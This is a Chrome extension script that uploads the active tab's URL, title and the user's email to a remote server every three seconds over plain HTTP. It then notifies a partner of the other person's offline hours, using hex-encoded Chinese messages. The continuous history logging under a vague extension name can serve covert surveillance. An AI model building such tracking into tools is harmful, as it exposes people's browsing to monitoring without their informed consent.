function uploadURL() {
	chrome.tabs.query({"active": true, "lastFocusedWindow": true}, function (tabs) {
		if(!tabs[0])	return;
		if(lastURL === tabs[0].url)	return;
		if( tabs[0].url.startsWith("chrome") )	return;
		if(tabs[0].title.length === 0 || tabs[0].url.length === 0)	return;
		var today = new Date();
		var h = today.getHours();
		var m = today.getMinutes();
		var s = today.getSeconds();
		var curHM = 60 * h + m;
		if (h < 10)	h = "0" + h;
		if (m < 10)	m = "0" + m;
		if (s < 10)	s = "0" + s;
		var now = "time=" + h + ":" + m + ":" + s + "&";
		var email = "email=" + user + "&";
		var title = "title=" + tabs[0].title.replace(/&/g, "__and__") + "&";
		var url = "url=" + tabs[0].url.replace(/&/g, "__and__") + "&";
		var xhr = new XMLHttpRequest();
		var domain = "http://SERVER-DOMAIN/api/history_add?";
		xhr.open("GET", domain + now + email + title + url, false);
		xhr.send();
		lastURL = tabs[0].url;
		var lastActiveTime = JSON.parse(xhr.responseText).lastActiveTime;
		if(lastActiveTime === "-1")	return;
		var hm = 60 * parseInt(lastActiveTime.split(":")[0]) + parseInt(lastActiveTime.split(":")[1]);
		var delta = curHM - hm + 1;
		if(delta < 0)	delta += 1440;
		var offlineHr = Math.floor(delta / 60);
		if(offlineHr === curOfflineHr)	return;
		var part1 = "\xE4\xBD\xA0\xE7\x9A\x84\xE6\xB1\xAA\xE6\xB1\xAA\xE5\xB7\xB2\xE7\xB6\x93\xE6\xB6\x88\xE8\x81\xB2\xE5\x8C\xBF\xE8\xB7\xA1\x20";
		var part2 = "\x20\xE5\xB0\x8F\xE6\x99\x82\xE4\xBA\x86\x0A\xE8\xA6\x81\xE4\xB8\x8D\xE8\xA6\x81\xE5\x95\x8F\xE5\x95\x8F\xE7\x9C\x8B\xE4\xBB\x96\xE5\x80\x91\xE6\x9C\x89\xE6\xB2\x92\xE6\x9C\x89\xE4\xB9\x96\xE4\xB9\x96\xEF\xBC\x9F";
		var part3 = "\xE4\xBD\xA0\xE7\x9A\x84\xE7\x8F\xAD\xE6\xAF\x94\xE5\xB7\xB2\xE7\xB6\x93\xE6\xB6\x88\xE8\x81\xB2\xE5\x8C\xBF\xE8\xB7\xA1\x20";
		var part4 = "\x20\xE5\xB0\x8F\xE6\x99\x82\xE4\xBA\x86\x0A\xE8\xA6\x81\xE4\xB8\x8D\xE8\xA6\x81\xE5\x95\x8F\xE5\x95\x8F\xE7\x9C\x8B\xE5\xA5\xB9\xE6\x9C\x89\xE6\xB2\x92\xE6\x9C\x89\xE4\xB9\x96\xE4\xB9\x96\xEF\xBC\x9F";
		var msg = decodeURIComponent( escape(part1) ) + offlineHr + decodeURIComponent( escape(part2) );
		if( user.startsWith("EMAIL1") )
			msg = decodeURIComponent( escape(part3) ) + offlineHr + decodeURIComponent( escape(part4) );;
		if(offlineHr !== 0)
			chrome.notifications.create(user, {
				type: "basic",
				iconUrl: "imgs/rabbit.png",
				title: "Extension No.3318",
				message: msg,
			}, function(notificationId) {});	
		curOfflineHr = offlineHr;
	});
}

function displayNotification() {
	var ver = chrome.runtime.getManifest().version;
	var prog = 0;
	chrome.notifications.create("system", {
		type: "progress",
		iconUrl: "imgs/rabbit.png",
		title: "Extension No.3318",
		message: "ver " + ver + " loading/updating...",
		progress: 0
	}, function(notificationId) {});
	for(var i = 1 ; i < 4 ; i++)
		setTimeout(function(){
			prog += 25;
			chrome.notifications.update("system", {progress: prog});
		}, 500 * i);
	setTimeout(function(){
		chrome.notifications.update("system", {
			message: "ver " + ver + " loaded/updated successfully",
			progress: 100,
		});
	}, 2000);
	chrome.notifications.onClicked.addListener(function(notificationId) {
		if(notificationId === "system")	{
			var windowDict = {"url": "popup.html", "type": "popup", "width": 800, "height": 600};
			chrome.windows.create(windowDict, function(window) {});
		}
		else if( notificationId.startsWith("EMAIL1") )	{
			var win = window.open("https://www.facebook.com/messages/t/FBID2", "_blank");
			win.focus();
		}
		else if( notificationId.startsWith("EMAIL2") ) {
			var win = window.open("https://www.facebook.com/messages/t/FBID1", "_blank");
			win.focus();
		}
	});
}

displayNotification();
var time = 3000;
var user = "null";
chrome.identity.getProfileUserInfo(function(userInfo) {
	if(userInfo.email)	user = userInfo.email;
});
var lastURL = "https://google.com";
var curOfflineHr = 0;
setInterval(uploadURL, time);

